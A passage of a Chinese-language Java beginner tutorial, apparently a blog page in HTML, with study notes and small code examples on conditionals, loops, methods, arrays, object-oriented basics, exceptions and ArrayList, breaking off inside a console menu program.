class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//需求 判断一个数是否大于0</span></span><br><span class="line">        <span class="comment">//给定一个数</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">13</span>;</span><br><span class="line">        <span class="comment">//判定</span></span><br><span class="line">        <span class="keyword">if</span>(num &gt;<span class="number">10</span>)&#123;<span class="comment">//if 后面是一个表达式，true or false ,只有为true才会返回&#123;&#125;</span></span><br><span class="line">            System.out.println(<span class="string">&quot;这个数字大于10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if双分支</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_31.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//需求是否大于10</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">8</span>;</span><br><span class="line">        <span class="keyword">if</span>(num &gt;<span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这个数字大于10&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;这个数小于等于10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>if多分支</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_32.png"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Gu0f3n.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTif03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//判断学生成绩的等级</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">score</span> <span class="operator">=</span><span class="number">84</span>;<span class="comment">//给定学生一个等级</span></span><br><span class="line"><span class="comment">//        if(score&gt;90)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为A&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        if(score&gt;80 &amp;&amp; score&lt;90)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为B&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;if(score&gt;70 &amp;&amp; score&lt;80)&#123;</span></span><br><span class="line"><span class="comment">//            System.out.println(&quot;该学生的等级为C&quot;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">        <span class="comment">//多分枝结构解决问题</span></span><br><span class="line">        <span class="keyword">if</span> (score &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为A&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为B&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为C&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (score &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为D&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">//兜底</span></span><br><span class="line">            System.out.println(<span class="string">&quot;该学生的等级为E&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h2><p> while循环<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/image_33.png" alt="img"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span><span class="number">1</span>;<span class="comment">//条件初始化</span></span><br><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (num&lt;=<span class="number">5</span>) &#123;<span class="comment">//如果表达式结果为true，那么就变成死循环//判断</span></span><br><span class="line">            sum = sum + num;<span class="comment">//循环体</span></span><br><span class="line">            num++;<span class="comment">//迭代</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>num&lt;&#x3D;5-&gt;true,sum:1，num:2-&gt;第一次循环结束<br>num&lt;&#x3D;5-&gt;true,sum：3，num：3-&gt;第二次循环结束<br>num&lt;&#x3D;5-&gt;true,sum：6，num：4-&gt;第三次循环结束<br>num&lt;&#x3D;5-&gt;true,sum:10,num：5-&gt;第四次循环结束<br>num&lt;&#x3D;5-&gt;true,sum:15;num:6-&gt;第五次循环结束<br>m&lt;&#x3D;5-&gt;false-&gt;循环停止</p><p>for循环</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> num=<span class="number">1</span>;num&lt;=<span class="number">5</span>;num++) &#123;<span class="comment">//1.条件初始，条件判断，迭代</span></span><br><span class="line">    sum = sum + num;<span class="comment">//循环体</span></span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;和为&quot;</span>+sum</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="方法和方法重载"><a href="#方法和方法重载" class="headerlink" title="方法和方法重载"></a>方法和方法重载</h2><p>方法</p><p>就是一段用来完成特定功能的代码片段</p><p>例如psvm，sout</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法声明格式</span><br><span class="line">修饰符1修饰符2]返回值类型方法名（形式对象名.方法名（实参列表）</span><br><span class="line">方法调用方式</span><br><span class="line">方法名（实参列表）（参数列表）</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTmethod</span> &#123;</span><br><span class="line">    <span class="comment">//提取一个方法， 将两个数求和</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">addNum</span><span class="params">(<span class="type">int</span> num1 ,<span class="type">int</span> num2)</span>&#123;</span><br><span class="line">            <span class="comment">//求和</span></span><br><span class="line"></span><br><span class="line">             <span class="type">int</span> sum=num1+num2;</span><br><span class="line">             <span class="keyword">return</span> sum;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//10，20</span></span><br><span class="line">         <span class="type">int</span> a=addNum(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        <span class="comment">//30，20</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> addNum(<span class="number">30</span>,<span class="number">20</span>);</span><br><span class="line">        System.out.println(b);</span><br><span class="line">        <span class="comment">//40，8186</span></span><br><span class="line">         addNum(<span class="number">40</span>,<span class="number">8186</span>);</span><br><span class="line">        System.out.println(addNum(<span class="number">40</span>,<span class="number">8186</span>));</span><br><span class="line">        <span class="comment">//1.方法 提高代码的复用性，写一次 直接调用即可</span></span><br><span class="line">    &#125;   <span class="comment">//public static  方法的修饰符</span></span><br><span class="line">        <span class="comment">// int 方法的返回值类型   方法返回值对应的数据类型</span></span><br><span class="line">    <span class="comment">// addNum 见名知意</span></span><br><span class="line">    <span class="comment">// num1 num2 形式参数列表 形参</span></span><br><span class="line">    <span class="comment">//10 20  实参</span></span><br><span class="line">    <span class="comment">//return sum; 方法的最后有方法的返回值（可有）如果没有返回值 方法申明出 加上void</span></span><br><span class="line">&#125;</span><br><span class="line">打印结果：</span><br><span class="line"><span class="number">30</span></span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">8226</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">方法的重载：</span><br><span class="line">在同一个类中，方法名相同，形参列表不同的多个方法，构成了方法的重载。</span><br></pre></td></tr></table></figure><p>方法名重复 但形参列表不一样&#x2F;&#x2F;方法 的重载只和形参列表有关</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组是相同类型数据的有序集合。其中，每一个数据称作一个元素，每个元素可以通过一个索引（下标）来访问它们。</p><p>特点</p><p>1.长度是确定的数组一旦被创建它的大小就是不可以改变的。<br>2.其元素的类型必须是相同类型，不允许出现混合类型<br>3.数组类型可以是任何数据类型，，包括基本类型和引用类型。<br>4.数组有索引的：索索引l从0开始，到数组.length-1结束</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TESTArray</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//数组声明</span></span><br><span class="line">        <span class="type">int</span>[] ary;<span class="comment">//定义一个数组</span></span><br><span class="line">        ary = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];<span class="comment">//给定一个数组的长度10</span></span><br><span class="line">        <span class="comment">//int ary =new int[10];一句话，默认长度的每个元素有默认的值</span></span><br><span class="line">        <span class="comment">//数组的赋值；</span></span><br><span class="line">        ary[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        ary[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">        ary[<span class="number">2</span>] = <span class="number">31</span>;</span><br><span class="line">        ary[<span class="number">3</span>] = <span class="number">365</span>;</span><br><span class="line">        ary[<span class="number">4</span>] = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//数组的使用</span></span><br><span class="line">        System.out.println(ary[<span class="number">3</span>]);</span><br><span class="line">        System.out.println(ary[<span class="number">1</span>]+<span class="number">30</span>);</span><br><span class="line">        <span class="comment">//数组的遍历（查看数组的每一个元素）</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;i &lt;=<span class="number">3</span>;i++)&#123;<span class="comment">//i代表元素的索引</span></span><br><span class="line">            System.out.println(<span class="string">&quot;第&quot;</span>+ i +<span class="string">&quot;个元素&quot;</span>+ary[i]);</span><br><span class="line">            System.out.println(<span class="string">&quot;增强的for循环&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> num:ary)&#123;</span><br><span class="line">    System.out.println(num);</span><br><span class="line">&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="面向对象-—类和对象"><a href="#面向对象-—类和对象" class="headerlink" title="面向对象 —类和对象"></a>面向对象 —类和对象</h2><p>类：对对象向上抽取出像的部分、公共的部分以此形成类，类就相当于一个模版。<br>对象：模版下具体的产物可以理解为具体对象，对象就是一个一个具体的实例，就<br>相当于这个模版下具体的产品。<br>Java中先定义类，再创建对象。</p><p>类的编写<br>1.给类起一个见名知意的名字，首字母大写，驼峰命名原则。<br>2.类的特性编写，特性即类的属性部分。<br>3.类的行为编写，行为即类的方法部分。<br>对象的创建和使用<br>创建格式：类名对象名&#x3D;new类名();<br>给对象的属性赋值：对象名.属性名&#x3D;值；<br>调用对象的方法：[返回值类型名字&#x3D;]对象名.方法名(参数列表);</p><p>对象的创建</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> test05;</span><br><span class="line"><span class="comment">//人类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="comment">//特性编写 属性（指定义与业务逻辑相关的代码）</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">double</span> height;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//行为 方法</span></span><br><span class="line">    <span class="comment">//定义一个学习的方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;伞兵一号卢本伟准备就绪&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">使用</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> test05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//程序入口</span></span><br><span class="line">        <span class="comment">//对我们的person类进行创建</span></span><br><span class="line">        <span class="type">person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">person</span>();<span class="comment">//实例化一个对象</span></span><br><span class="line">        p1.name = <span class="string">&quot;Gu0f3n&quot;</span>;</span><br><span class="line">        p1.age = <span class="number">20</span>;</span><br><span class="line">        p1.height=<span class="number">181.99</span>;</span><br><span class="line">        System.out.println(p1.age);</span><br><span class="line">        System.out.println(p1.height);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="构造器"><a href="#构造器" class="headerlink" title="构造器"></a>构造器</h2><p>作用</p><p>对于一个类来说，一般有三种常见的成员：<strong>属性、方法、构造器。</strong><br>这三种成员都可以定义零个或多个。<br><strong>构造方法</strong>也叫构造器，是一个创建对象时被<strong>自动调用</strong>的特殊方法，用于对象的<strong>初始化。</strong><br>Java通过new关键字来调用构造器，从而返回该类的实例。</p><p>构造器声明类型</p><p>声明格式：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[修饰符]类名（形参列表）</span><br><span class="line">//n条语句</span><br></pre></td></tr></table></figure><p>若无参数列表，称之为无参构造器（空构造器）<br>若有参数列表，称之为有参构造器</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>我们程序设计追求“高内聚，低耦合”。</p><blockquote><p>高内聚：类的内部数据操作细节自己完成，不允许外部干涉；<br>低耦合：仅对外暴露少量的方法用于使用。<br>隐藏对象内部的复杂性，只对外公开简单的接口。便于外界调用，从而提高系<br>统的可扩展性、可维护性，提高程序的安全性。通俗的说，把该隐藏的隐藏起<br>来，该暴露的暴露出来。这就是封装性的设计思想。</p></blockquote><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p><strong>类是对对象的抽象</strong></p><p><strong>继承是对类的抽象</strong></p><p>随便写点代码练习一下</p><p>父类person</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">person</span> &#123;</span><br><span class="line">    <span class="type">int</span> age;</span><br><span class="line">    <span class="type">double</span> height;</span><br><span class="line">    String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getHeight</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHeight</span><span class="params">(<span class="type">double</span> height)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.height = height;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//吃饭</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//睡觉</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//打豆豆</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dadoudou</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;打豆豆哦&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">students</span> <span class="keyword">extends</span> <span class="title class_">person</span>&#123;<span class="comment">//子类继承自父类</span></span><br><span class="line">    <span class="comment">//定义子类自己的属性和方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> sno;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSno</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> sno;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSno</span><span class="params">(<span class="type">int</span> sno)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sno = sno;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">study</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;study&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">students</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">students</span>();</span><br><span class="line">        s.setSno(<span class="number">24710245</span>);</span><br><span class="line">        s.age=<span class="number">18</span>;</span><br><span class="line">        s.height=<span class="number">181.6</span>;</span><br><span class="line">        s.name=<span class="string">&quot;xiaobia&quot;</span>;</span><br><span class="line">        s.eat();</span><br><span class="line">        s.study();</span><br><span class="line">        s.dadoudou();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//发现具体的类我可以随意调用</span></span><br><span class="line">#eat</span><br><span class="line">#study</span><br><span class="line">#打豆豆哦</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>好处：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.提高 代码的复用性</span><br><span class="line"></span><br><span class="line">2.便于代码的扩展</span><br><span class="line"></span><br><span class="line">3.为了多态的使用</span><br></pre></td></tr></table></figure><p><strong>方法的重写</strong></p><p>发生在子类和父类，当子类对父类的提供的方法不满意的时候，要对父类方法进行重写</p><p><strong>格式要求</strong></p><p>子类的方法名字和父类必须一直，参数列表（个数，类型，顺序）</p><p><strong>与重载的区别</strong></p><p>重载：在同一个类中，当方法名相同，形参列表不同的时候，多个方法构成重载</p><p>重写：不同类中，子类对父类的提供方法不满意，可对父类进行重写</p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p><strong>概念</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">多种状态，具体一点基于是去完成某个行为，当不同对象去完成时会产生出不同的状态。同意行为，不同的子类呈现的状态不同</span><br><span class="line">ps:多态与属性无关，多态指的方法的多态，而不是属性</span><br></pre></td></tr></table></figure><p>多态的三要素：继承，重写，父类引用指向子类对象</p><p>多态的好处：提高代码的扩展性</p><h2 id="异常的处理"><a href="#异常的处理" class="headerlink" title="异常的处理"></a>异常的处理</h2><p>异常就是在程序中的运行过程中所发生的不正常的时间，他会中断正在运行的程序</p><p>所需文件找不到<br>网络连接不通或中断<br>算术运算错 (被零除..)<br>数组下标越界<br>装载一个不存在的类或者对null对象操作<br>类型转换异常</p><p>Java提供异常处理机制。它将异常处理代码和和业务代码分离，使程序更优雅，更好的<br>容错性，高键壮性。<br>Java的异常处理是通过5个关键字来实现的：<strong>try、catch、finally、throw、throws</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try-catch执行情况</span><br><span class="line">情况1：try块中代码没有出现异常</span><br><span class="line">不执行catch块代码，执行catch块后边的代码</span><br><span class="line">情况2：try块中代码出现异常，catch中异常类型匹配（相同或者父类）</span><br><span class="line">Java会生成相应的异常对象，Java系统寻找匹配的catch块，执行catch块代码，执行</span><br><span class="line">catch块后边的代码。try块中尚未执行的语句不会执行。</span><br><span class="line">情况3：try块中代码出现异常，catch中异常类型不匹配</span><br><span class="line">不执行catch块代码，不执行catch块后边的代码，程序会中断运行</span><br><span class="line">catch块中如何处理异常</span><br><span class="line">其中一种方式：自定义内容输出</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test06;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//两个数求商</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">int</span> num1=<span class="number">12</span>;</span><br><span class="line">            <span class="type">int</span> num2=<span class="number">0</span>;</span><br><span class="line">            System.out.println(<span class="string">&quot;两个数的商&quot;</span>+num1/num2);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;对不起，程序有问题&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">#对不起，程序有问题</span><br></pre></td></tr></table></figure><p>throw和throws的区别：<br>（1）位置不同：<br>throw：方法内部<br>throws：方法的签名处，方法的声明处<br>（2）内容不同：<br>throw+异常对象D<br>throws+异常的类型<br>（3）作用不同：<br>throw：异常出现的源头，制造异常。<br>throws：在方法的声明处，告诉方法的调用者，这个方法中可能会出现我声明的这些异<br>常。然后调用者对这个异常进行处理：要么自己处理要么再继续向外抛出异常。</p><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>数组的缺点 –.&gt; 集合的优点</p><p>（1）数组一旦指定了长度，那么长度就被确定了，不可以更改。<br>（2）删除，增加元素效率低。</p><p> （3）数组中实际元素的数量是没有办法获取的，没有提供对应的方法或者属性来获取</p><p>（4）对于无序的，不可重复的场合数组不能满足要求。</p><p>集合体系非常庞大</p><p>ArrayList()</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test07;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.management.resource.internal.inst.SocketOutputStreamRMHooks;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ArrayList</span>  <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">         list.add(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">         list.add(<span class="string">&quot;B&quot;</span>);</span><br><span class="line">         list.add(<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">        list.set(<span class="number">0</span>, <span class="string">&quot;D&quot;</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">        list.get(<span class="number">2</span>);</span><br><span class="line">        System.out.println(list.get(<span class="number">2</span>));</span><br><span class="line">        list.remove(<span class="number">2</span>);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//[A, B, C]</span></span><br><span class="line"><span class="comment">//[D, B, C]</span></span><br><span class="line"><span class="comment">//C</span></span><br><span class="line"><span class="comment">//[D, B]</span></span><br></pre></td></tr></table></figure><p>简单写个小项目</p><p>写个小菜单</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Gu0f3n.java.test08;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.SQLOutput;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="comment">//【选择你的心仪对象】</span></span><br><span class="line">  <span class="comment">// 展示女嘉宾</span></span><br><span class="line">  <span class="comment">// 上场女嘉宾</span></span><br><span class="line">  <span class="comment">// 下场女嘉宾</span></span><br><span class="line">  <span class="comment">// 退出</span></span><br><span class="line"><span class="comment">//女嘉宾编号 女嘉宾名字 女嘉宾年龄</span></span><br><span class="line"><span class="comment">//  1           wws        18</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//打印菜单</span></span><br><span class="line">        ArrayList list=<span class="keyword">new</span> <span class="title class_">ArrayList</span>();<span class="comment">//空集合 注意作用范围，</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;请选择你要的操作&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----1.展示女嘉宾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----2.上场女嘉宾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----3.下场女嘉宾-----&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;-----4.退出本项目-----&quot;</span>);</span><br><span class="line">            <span class="comment">//借助Scanner 类</span></span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">            <span class="comment">//利用键盘录入序号：</span></span><br><span class="line">            System.out.println(<span class="string">&quot;请输入要执行功能的序号:&quot;</span>);</span><br><span class="line">            sc.nextInt();</span><br><span class="line">            <span class="type">int</span> <span class="variable">choice</span> <span class="operator">=</span> sc.nextInt();</span><br><span class="line">            <span class="comment">//根据choice 录入功能序号进行后续判断</span></span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;1.展示女嘉宾&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=list.size()-<span class="number">1</span>;i++)&#123;</span><br><span class="line">                    Girl g=(Girl)(list.get(i));</span><br><span class="line">                    System.out.println(g.getGnum()+<span class="string">&quot;---&quot;</span>+g.getGname()+<span class="string">&quot;---&quot;</span>+g.getGage());</span><br><span class="line">                &#125;</span><br><span 